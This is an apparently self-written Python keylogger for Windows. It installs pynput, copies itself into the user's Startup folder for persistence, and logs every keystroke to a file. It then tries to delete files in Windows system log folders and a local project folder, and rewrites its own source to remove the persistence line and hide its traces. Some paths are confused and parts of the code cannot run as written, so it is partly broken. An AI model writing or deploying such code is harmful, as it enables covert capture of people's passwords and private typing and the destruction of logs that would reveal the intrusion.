import subprocess
subprocess.call(['pip', 'install', 'pynput', 'getpass', 'logging'])
import getpass
import os
import shutil
import smtplib
import logging
import datetime
from pynput.keyboard import Key, Listener
log_directory = os.path.abspath(__file__)
shutil.move(os.path.abspath(__file__), 'C:\\Users\\'+getpass.getuser()+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
logging.basicConfig(filename = (log_directory + "log_results.txt"), level = logging.DEBUG, format = '%(asctime)s : %(message)s')
def keypress(Key):
    logging.info(str(Key))
with Listener(on_press = keypress) as listener:
        listener.join()
for file in os.listdir(r'C:\Windows\System32\Logs'):
    file_path = os.path.join(r'C:\Prabhav\Project\chatbot', file)
    if os.path.isfile(file_path):
        os.remove(file_path)
for folder in os.listdir(r'C:\Prabhav\Project\chatbot'):
    for file in os.listdir('C:\\Prabhav\\Project\\chatbot\\'+folder):
        file_path = os.path.join('C:\\Windows\\System32\\LogFiles'+folder, file)
        if os.path.isfile(file_path):
            os.remove(file_path)
file=open(os.path.abspath(__file__), "r+")
file.seek(270)
f=file.read(6)
file.close()
if f=="shutil":
    file=open(os.path.abspath(__file__), "r+")
    alldata=file.read()
    file.seek(270)
    f=file.read(144)
    alldata=alldata.replace(f,"")
    file.seek(0)
    file.write(alldata)
